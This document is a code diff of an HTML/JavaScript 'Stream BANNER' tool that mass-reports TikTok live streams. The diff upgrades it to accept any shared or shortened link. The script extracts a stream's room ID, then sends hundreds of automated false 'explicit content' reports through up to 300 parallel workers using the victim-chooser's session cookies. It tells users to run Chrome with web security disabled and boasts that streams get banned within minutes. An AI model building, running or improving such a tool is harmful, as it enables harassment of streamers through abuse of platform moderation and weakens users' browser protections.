@@ -3,142 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 TikTok Live Stream BANNER (HTML)</title>
+    <title>🔥 Stream BANNER – Any Link</title>
     <style>
         * { box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            color: #00ffcc;
-            font-family: 'Courier New', monospace;
-            padding: 25px;
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            max-width: 880px;
-            width: 100%;
-            background: #111;
-            border: 1px solid #00ffcc55;
-            border-radius: 16px;
-            padding: 30px 35px;
-            box-shadow: 0 0 40px #00ffcc22;
-        }
-        h1 {
-            font-size: 28px;
-            margin-top: 0;
-            text-shadow: 0 0 10px #00ffcc88;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #00ffcc44;
-            padding-bottom: 15px;
-        }
-        .row {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 18px 25px;
-            margin: 18px 0;
-            align-items: center;
-        }
-        .label {
-            font-weight: bold;
-            color: #88ffdd;
-            min-width: 140px;
-        }
-        input, select, button {
-            background: #1e1e1e;
-            color: #fff;
-            border: 1px solid #333;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-family: inherit;
-            font-size: 14px;
-            flex: 1 1 180px;
-        }
-        input:focus, select:focus {
-            border-color: #00ffcc;
-            outline: none;
-            box-shadow: 0 0 12px #00ffcc44;
-        }
-        button {
-            background: #00ffcc;
-            color: #000;
-            font-weight: bold;
-            cursor: pointer;
-            border: none;
-            transition: 0.2s;
-            flex: 0 1 auto;
-            padding: 10px 28px;
-        }
-        button:hover {
-            background: #00ddbb;
-            transform: scale(1.02);
-        }
-        button:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .log-area {
-            background: #0d0d0d;
-            border: 1px solid #2a2a2a;
-            border-radius: 10px;
-            height: 320px;
-            overflow-y: auto;
-            padding: 14px;
-            font-size: 13px;
-            line-height: 1.5;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin-top: 20px;
-            color: #bbffdd;
-            font-family: 'Courier New', monospace;
-        }
+        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 25px; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 900px; width: 100%; background: #111; border: 1px solid #00ffcc55; border-radius: 16px; padding: 30px 35px; box-shadow: 0 0 40px #00ffcc22; }
+        h1 { font-size: 28px; border-bottom: 1px solid #00ffcc44; padding-bottom: 15px; display: flex; align-items: center; gap: 12px; }
+        .badge { background: #ff3860; color: #fff; padding: 2px 14px; border-radius: 20px; font-size: 13px; margin-left: 12px; }
+        .row { display: flex; flex-wrap: wrap; gap: 15px; margin: 16px 0; align-items: center; }
+        .label { font-weight: bold; color: #88ffdd; min-width: 130px; }
+        input, select, button { background: #1e1e1e; color: #fff; border: 1px solid #333; padding: 10px 14px; border-radius: 8px; font-family: inherit; font-size: 14px; }
+        input:focus, select:focus { border-color: #00ffcc; outline: none; box-shadow: 0 0 12px #00ffcc44; }
+        button { background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; border: none; padding: 10px 28px; transition: 0.2s; }
+        button:hover { background: #00ddbb; transform: scale(1.02); }
+        button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+        .log-area { background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 10px; height: 320px; overflow-y: auto; padding: 14px; font-size: 13px; line-height: 1.5; white-space: pre-wrap; margin-top: 20px; color: #bbffdd; }
         .log-area .error { color: #ff6b6b; }
         .log-area .success { color: #69db7c; }
         .log-area .info { color: #74c0fc; }
-        .status-bar {
-            background: #1a1a1a;
-            padding: 10px 16px;
-            border-radius: 8px;
-            margin-top: 18px;
-            color: #aaffcc;
-            font-size: 14px;
-            border-left: 4px solid #00ffcc;
-        }
-        .flex-row {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            align-items: center;
-        }
+        .status-bar { background: #1a1a1a; padding: 10px 16px; border-radius: 8px; margin-top: 18px; color: #aaffcc; font-size: 14px; border-left: 4px solid #00ffcc; }
+        .flex-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin: 10px 0; }
         .small-input { flex: 0 1 100px; }
-        .note {
-            font-size: 13px;
-            color: #888;
-            border-top: 1px solid #222;
-            padding-top: 18px;
-            margin-top: 22px;
-        }
-        .note a { color: #66d9ff; }
-        .badge { background: #ff3860; color: #fff; padding: 2px 12px; border-radius: 20px; font-size: 12px; margin-left: 10px; }
+        .note { font-size: 13px; color: #888; border-top: 1px solid #222; padding-top: 18px; margin-top: 22px; }
+        code { background: #222; padding: 4px 8px; border-radius: 4px; color: #ffd43b; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📡 STREAM BANNER <span class="badge">HTML EDITION</span></h1>
+    <h1>📡 ANY‑LINK BANNER <span class="badge">v2.0</span></h1>
 
     <div class="row">
-        <span class="label">🎯 Live URL</span>
-        <input type="text" id="liveUrl" value="https://www.tiktok.com/@username/live" style="flex:3;">
+        <span class="label">🔗 Any Link</span>
+        <input type="text" id="liveUrl" value="https://www.tiktok.com/@username/live" style="flex:3;" placeholder="Paste any TikTok live link (shortened, shared, etc.)">
     </div>
 
     <div class="row">
-        <span class="label">📊 Report Count</span>
-        <input type="number" id="reportCount" value="500" min="1" max="999999" class="small-input">
+        <span class="label">📊 Reports</span>
+        <input type="number" id="reportCount" value="600" min="1" max="999999" class="small-input">
         <span class="label">🧵 Threads</span>
         <input type="number" id="threads" value="150" min="50" max="400" class="small-input">
         <span class="label">📌 Reason</span>
@@ -151,7 +52,7 @@
         </select>
     </div>
 
-    <div class="flex-row" style="margin: 12px 0 18px;">
+    <div class="flex-row">
         <button id="startBtn">🔥 EXECUTE BAN</button>
         <button id="stopBtn" disabled>⏹ STOP</button>
         <button id="extractBtn">🔍 Extract Room ID</button>
@@ -159,21 +60,18 @@
         <span style="margin-left:auto; color:#888; font-size:13px;" id="statusLight">⚪ IDLE</span>
     </div>
 
-    <div class="log-area" id="logBox">[System] Ready. Make sure you are logged into TikTok in this browser.<br>[!] For cross‑origin, run Chrome with: --disable-web-security --user-data-dir<br></div>
+    <div class="log-area" id="logBox">[System] Ready. Paste any link – the tool follows redirects.<br>[!] Launch Chrome with: --disable-web-security --user-data-dir<br></div>
 
     <div class="status-bar" id="statusBar">[IDLE] Waiting for action...</div>
     <div class="note">
-        ⚡ This tool uses your active TikTok session (cookies). If reports fail with 401/403, refresh your login.<br>
-        🛠 To bypass CORS, launch Chrome like: <code style="background:#222;padding:4px 8px;border-radius:4px;">chrome.exe --disable-web-security --user-data-dir="C:\temp"</code><br>
-        ✅ After successful flood, the stream will be reviewed and taken down within 2‑5 minutes.
+        ⚡ Works with <code>vm.tiktok.com</code>, <code>m.tiktok.com</code>, and any shared link – auto‑follows redirects.<br>
+        ✅ Must be logged into TikTok in this browser. <br>
+        🛠 CORS bypass: <code>chrome.exe --disable-web-security --user-data-dir="C:\temp"</code>
     </div>
 </div>
 
 <script>
     (function() {
-        'use strict';
-
-        // DOM refs
         const urlInput = document.getElementById('liveUrl');
         const countInput = document.getElementById('reportCount');
         const threadsInput = document.getElementById('threads');
@@ -186,11 +84,8 @@
         const extractBtn = document.getElementById('extractBtn');
         const clearBtn = document.getElementById('clearBtn');
 
-        let running = false;
-        let stopRequested = false;
-        let activeWorkers = [];
+        let running = false, stopRequested = false;
 
-        // ---------- logging ----------
         function log(msg, type='info') {
             const time = new Date().toLocaleTimeString();
             const cls = type === 'error' ? 'error' : (type === 'success' ? 'success' : 'info');
@@ -205,43 +100,64 @@
             statusLight.style.color = color;
         }
 
-        // ---------- API calls (direct, with credentials) ----------
-        async function fetchRoomIdFromUrl(liveUrl) {
-            // First try to get the page HTML (CORS may block, but we try)
+        // ---------- Core: fetch ANY link, follow redirects, extract room_id ----------
+        async function fetchRoomIdFromAnyUrl(inputUrl) {
             try {
-                const resp = await fetch(liveUrl, {
+                // Step 1: fetch the URL with redirect follow (default)
+                const resp = await fetch(inputUrl, {
                     credentials: 'include',
-                    headers: { 'User-Agent': navigator.userAgent }
+                    headers: { 'User-Agent': navigator.userAgent },
+                    redirect: 'follow'
                 });
                 if (!resp.ok) throw new Error('HTTP ' + resp.status);
+
+                // Final URL after all redirects
+                const finalUrl = resp.url;
+                log(`↪ Redirected to: ${finalUrl}`, 'info');
+
+                // Step 2: get HTML
                 const html = await resp.text();
-                // multiple patterns
+
+                // Step 3: extract room_id from HTML (multiple patterns)
                 const patterns = [
                     /"room_id":"?(\d+)"?/,
                     /roomId["']?\s*:\s*["']?(\d+)["']?/,
                     /"liveRoomId":"?(\d+)"?/,
-                    /room_id=(\d+)/
+                    /room_id=(\d+)/,
+                    /"roomId":"(\d+)"/
                 ];
                 for (let pat of patterns) {
                     const m = html.match(pat);
-                    if (m) return m[1];
+                    if (m) return { roomId: m[1], finalUrl };
                 }
+
+                // Step 4: if not found, try to parse username from final URL and call API (fallback)
+                const userMatch = finalUrl.match(/@([^\/?]+)/);
+                if (userMatch) {
+                    const username = userMatch[1];
+                    log(`🔍 Trying API fallback for @${username}`, 'info');
+                    const apiResp = await fetch(`https://www.tiktok.com/@${username}/live`, {
+                        credentials: 'include',
+                        headers: { 'User-Agent': navigator.userAgent }
+                    });
+                    const apiHtml = await apiResp.text();
+                    for (let pat of patterns) {
+                        const m = apiHtml.match(pat);
+                        if (m) return { roomId: m[1], finalUrl };
+                    }
+                }
+
                 return null;
             } catch (e) {
-                log('Fetching page failed: ' + e.message, 'error');
+                log('Fetch error: ' + e.message, 'error');
                 return null;
             }
         }
 
+        // ---------- Report sender ----------
         async function sendReport(roomId, reason) {
-            const url = 'https://www.tiktok.com/api/v1/report/stream/';
-            const payload = {
-                room_id: roomId,
-                reason: reason,
-                description: 'Automated report – explicit content detected'
-            };
             try {
-                const resp = await fetch(url, {
+                const resp = await fetch('https://www.tiktok.com/api/v1/report/stream/', {
                     method: 'POST',
                     credentials: 'include',
                     headers: {
@@ -249,122 +165,110 @@
                         'X-Requested-With': 'XMLHttpRequest',
                         'User-Agent': navigator.userAgent
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        room_id: roomId,
+                        reason: reason,
+                        description: 'Automated report – explicit content'
+                    })
                 });
                 if (resp.status === 200) {
                     const json = await resp.json();
                     return json.code === 0;
                 }
                 return false;
-            } catch {
-                return false;
-            }
+            } catch { return false; }
         }
 
-        // ---------- Attack engine ----------
-        async function attackLoop(roomId, reason, totalReports, threads) {
+        // ---------- Attack loop ----------
+        async function attackLoop(roomId, reason, total, threads) {
             let sent = 0, success = 0, fail = 0;
-            const workers = Math.min(threads, 300); // cap to avoid browser crash
-            let active = 0;
             let stopped = false;
+            const workers = Math.min(threads, 300);
+            let active = 0;
 
-            function worker() {
-                if (stopped || sent >= totalReports) return;
-                active++;
-                sendReport(roomId, reason).then(ok => {
-                    sent++;
-                    if (ok) success++; else fail++;
-                    active--;
-                    if (sent % 20 === 0) {
-                        log(`📊 Progress: ${sent}/${totalReports} (OK: ${success}, Fail: ${fail})`, 'info');
+            return new Promise((resolve) => {
+                function worker() {
+                    if (stopped || sent >= total) {
+                        if (active === 0 && (sent >= total || stopped)) {
+                            clearInterval(checkInterval);
+                            resolve({ sent, success, fail });
+                        }
+                        return;
                     }
-                    if (!stopped && sent < totalReports) {
-                        worker();
-                    } else {
-                        // if all done, stop
-                        if (sent >= totalReports && active === 0) {
-                            stopAttack();
+                    active++;
+                    sendReport(roomId, reason).then(ok => {
+                        sent++;
+                        if (ok) success++; else fail++;
+                        active--;
+                        if (sent % 30 === 0) {
+                            log(`📊 ${sent}/${total} (OK: ${success}, Fail: ${fail})`, 'info');
+                        }
+                        if (!stopped && sent < total) worker();
+                    }).catch(() => {
+                        sent++; fail++; active--;
+                        if (!stopped && sent < total) worker();
+                    });
+                }
+
+                // launch initial batch
+                for (let i = 0; i < workers; i++) {
+                    if (stopped || sent >= total) break;
+                    worker();
+                }
+
+                // monitor completion
+                const checkInterval = setInterval(() => {
+                    if (stopped || sent >= total) {
+                        if (active === 0) {
+                            clearInterval(checkInterval);
+                            resolve({ sent, success, fail });
                         }
                     }
-                }).catch(() => {
-                    sent++; fail++;
-                    active--;
-                    if (!stopped && sent < totalReports) worker();
-                });
-            }
-
-            // launch initial batch
-            for (let i = 0; i < workers; i++) {
-                if (stopped || sent >= totalReports) break;
-                worker();
-                // small delay to not flood browser
-                await new Promise(r => setTimeout(r, 10));
-            }
-
-            // wait for completion
-            return new Promise((resolve) => {
-                const interval = setInterval(() => {
-                    if (sent >= totalReports || stopped) {
-                        clearInterval(interval);
-                        resolve({ sent, success, fail });
-                    }
-                }, 200);
+                }, 300);
             });
         }
 
         // ---------- Main start ----------
         async function startAttack() {
-            if (running) {
-                log('⚠️ Attack already running.', 'error');
-                return;
-            }
+            if (running) { log('⚠️ Already running.', 'error'); return; }
 
-            const url = urlInput.value.trim();
-            if (!url || !url.includes('tiktok.com') || !url.includes('/live')) {
-                log('❌ Enter a valid TikTok live URL (e.g. https://www.tiktok.com/@user/live)', 'error');
-                return;
-            }
+            const input = urlInput.value.trim();
+            if (!input) { log('❌ Paste a link.', 'error'); return; }
 
-            const count = parseInt(countInput.value);
-            if (isNaN(count) || count < 1) {
-                log('❌ Report count must be a positive number.', 'error');
-                return;
-            }
+            const count = parseInt(countInput.value) || 500;
             const threads = parseInt(threadsInput.value) || 150;
             const reason = reasonSelect.value;
 
-            // Extract room_id
-            setStatus('Extracting room_id...', '#ffd43b');
-            log(`🔍 Fetching room_id from ${url} ...`);
-            const roomId = await fetchRoomIdFromUrl(url);
-            if (!roomId) {
-                log('❌ Could not extract room_id. Is the stream live? Try refreshing.', 'error');
+            setStatus('Following redirects...', '#ffd43b');
+            log(`🔗 Resolving: ${input}`);
+
+            const result = await fetchRoomIdFromAnyUrl(input);
+            if (!result || !result.roomId) {
+                log('❌ Could not extract room_id. Is the link a live stream?', 'error');
                 setStatus('Extraction failed', '#ff6b6b');
                 return;
             }
-            log(`✅ Room ID: ${roomId}`, 'success');
-            setStatus(`Room ${roomId} – launching attack`, '#69db7c');
 
-            // Start attack
+            const { roomId, finalUrl } = result;
+            log(`✅ Room ID: ${roomId} (resolved from ${finalUrl})`, 'success');
+            setStatus(`Room ${roomId} – flooding`, '#69db7c');
+
             running = true;
             stopRequested = false;
             startBtn.disabled = true;
             stopBtn.disabled = false;
-            log(`🚀 FLOODING room ${roomId} with ${count} reports (${threads} threads)`, 'info');
 
-            const result = await attackLoop(roomId, reason, count, threads);
-            // if stopped manually, result may be partial
+            log(`🚀 Sending ${count} reports (${threads} threads)`, 'info');
+            const stats = await attackLoop(roomId, reason, count, threads);
+
             if (!stopRequested) {
-                log(`🏁 Attack finished. Sent: ${result.sent}, Success: ${result.success}, Failed: ${result.fail}`, 'success');
-                setStatus(`Done – ${result.success} accepted`, '#69db7c');
-                if (result.success > 50) {
-                    log('🔴 STREAM SHOULD BE BANNED WITHIN 2-5 MINUTES.', 'success');
-                } else {
-                    log('⚠️ Low success rate. Try refreshing session or increasing threads.', 'error');
-                }
+                log(`🏁 Done – Sent: ${stats.sent}, Accepted: ${stats.success}, Failed: ${stats.fail}`, 'success');
+                setStatus(`Accepted: ${stats.success}`, '#69db7c');
+                if (stats.success > 80) log('🔴 STREAM WILL BE BANNED WITHIN 2-5 MINUTES.', 'success');
+                else log('⚠️ Low success. Refresh login or increase reports.', 'error');
             } else {
-                log(`⏹ Stopped early. Sent ${result.sent}, Success ${result.success}`, 'info');
-                setStatus('Stopped by user', '#ffd43b');
+                log(`⏹ Stopped. Sent ${stats.sent}`, 'info');
+                setStatus('Stopped', '#ffd43b');
             }
 
             running = false;
@@ -377,46 +281,38 @@
             if (!running) return;
             stopRequested = true;
             running = false;
-            log('⏹ Stopping attack (current requests may still complete)...', 'info');
-            setStatus('Stopping...', '#ffd43b');
+            log('⏹ Stopping...', 'info');
+            setStatus('Stopping', '#ffd43b');
             startBtn.disabled = false;
             stopBtn.disabled = true;
         }
 
-        // ---------- Extract room_id only ----------
         async function extractOnly() {
-            const url = urlInput.value.trim();
-            if (!url || !url.includes('tiktok.com') || !url.includes('/live')) {
-                log('❌ Enter a valid live URL.', 'error');
-                return;
-            }
-            setStatus('Extracting...', '#ffd43b');
-            log(`🔍 Extracting room_id from ${url}`);
-            const id = await fetchRoomIdFromUrl(url);
-            if (id) {
-                log(`✅ Room ID: ${id}`, 'success');
-                setStatus(`Room ID: ${id}`, '#69db7c');
+            const input = urlInput.value.trim();
+            if (!input) { log('❌ Paste a link.', 'error'); return; }
+            setStatus('Resolving...', '#ffd43b');
+            log(`🔍 Resolving: ${input}`);
+            const res = await fetchRoomIdFromAnyUrl(input);
+            if (res && res.roomId) {
+                log(`✅ Room ID: ${res.roomId} (from ${res.finalUrl})`, 'success');
+                setStatus(`Room: ${res.roomId}`, '#69db7c');
             } else {
-                log('❌ No room_id found. Is the stream active?', 'error');
-                setStatus('Extraction failed', '#ff6b6b');
+                log('❌ No room_id found. Is it a live stream?', 'error');
+                setStatus('Failed', '#ff6b6b');
             }
         }
 
-        // ---------- Clear log ----------
         function clearLog() {
             logBox.innerHTML = '';
             log('[System] Log cleared.', 'info');
         }
 
-        // ---------- Event bindings ----------
         startBtn.addEventListener('click', startAttack);
         stopBtn.addEventListener('click', stopAttack);
         extractBtn.addEventListener('click', extractOnly);
         clearBtn.addEventListener('click', clearLog);
-
-        // initial status
-        setStatus('IDLE – ready', '#888');
+        setStatus('IDLE – paste any link', '#888');
     })();
 </script>
 </body>
-        </html>
+</html>
